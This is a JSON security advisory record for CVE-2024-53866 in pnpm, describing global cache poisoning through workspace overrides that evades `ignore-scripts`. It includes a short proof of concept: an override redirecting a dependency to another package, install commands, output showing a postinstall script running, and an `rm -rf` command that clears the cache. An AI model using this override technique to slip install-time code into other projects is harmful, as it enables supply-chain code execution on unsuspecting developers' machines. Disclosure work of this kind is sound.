{
  "Severity": "MODERATE",
  "UpdatedAt": "2024-12-10T22:42:44Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "pnpm"
  },
  "Advisory": {
    "DatabaseId": 271371,
    "Id": "GSA_kwCzR0hTQS12bTMyLTlycWYtcmgzcs4ABCQL",
    "GhsaId": "GHSA-vm32-9rqf-rh3r",
    "References": [
      {
        "Url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-53866"
      },
      {
        "Url": "https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743"
      },
      {
        "Url": "https://github.com/advisories/GHSA-vm32-9rqf-rh3r"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-vm32-9rqf-rh3r"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-53866"
      }
    ],
    "Description": "### Summary\n\npnpm seems to mishandle overrides and global cache:\n1. Overrides from one workspace leak into npm metadata saved in global cache\n2. npm metadata from global cache affects other workspaces\n3. installs by default don't revalidate the data (including on first lockfile generation)\n\nThis can make workspace A (even running with `ignore-scripts=true`) posion global cache and execute scripts in workspace B\n\nUsers generally expect `ignore-scripts` to be sufficient to prevent immediate code execution on install (e.g. when the tree is just repacked/bundled without executing it).\n\nHere, that expectation is broken\n\n### Details\n\nSee PoC.\n\nIn it, overrides from a single run of A get leaked into e.g. `~/Library/Caches/pnpm/metadata/registry.npmjs.org/rimraf.json` and persistently affect all other projects using the cache\n\n### PoC\n\nPostinstall code used in PoC is benign and can be inspected in \u003chttps://www.npmjs.com/package/ponyhooves?activeTab=code\u003e, it's just a `console.log`\n\n1. Remove store and cache\n   On mac: `rm -rf ~/Library/Caches/pnpm ~/Library/pnpm/store`\n   This step is not required in general, but we'll be using a popular package for PoC that's likely cached\n2. Create `A/package.json`:\n   ```json\n   {\n     \"name\": \"A\",\n     \"pnpm\": { \"overrides\": { \"rimraf\u003eglob\": \"npm:ponyhooves@1\" } },\n     \"dependencies\": { \"rimraf\": \"6.0.1\" }\n   }\n   ```\n   Install it with `pnpm i --ignore-scripts` (the flag is not required, but the point of the demo is to show that it doesn't help)\n4. Create `B/package.json`:\n   ```json\n   {\n     \"name\": \"B\",\n     \"dependencies\": { \"rimraf\": \"6.0.1\" }\n   }\n   ```\n   Install it with `pnpm i`\n\nResult:\n```console\nPackages: +3\n+++\nProgress: resolved 3, reused 3, downloaded 0, added 3, done\nnode_modules/.pnpm/ponyhooves@1.0.1/node_modules/ponyhooves: Running postinstall script, done in 51ms\n\ndependencies:\n+ rimraf 6.0.1\n\nDone in 1.4s\n```\n\nAlso, that code got leaked into another project and it's lockfile now! \n\n### Impact\n\nGlobal state integrity is lost via operations that one would expect to be secure, enabling subsequently running arbitrary code execution on installs\n\nAs a work-around, use separate cache and store dirs in each workspace\n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-12-10T22:42:41Z",
    "Severity": "MODERATE",
    "Summary": "pnpm no-script global cache poisoning via overrides / `ignore-scripts` evasion",
    "UpdatedAt": "2024-12-10T22:42:44Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "9.15.0"
      },
      "VulnerableVersionRange": "\u003c 9.15.0"
    }
  ]
}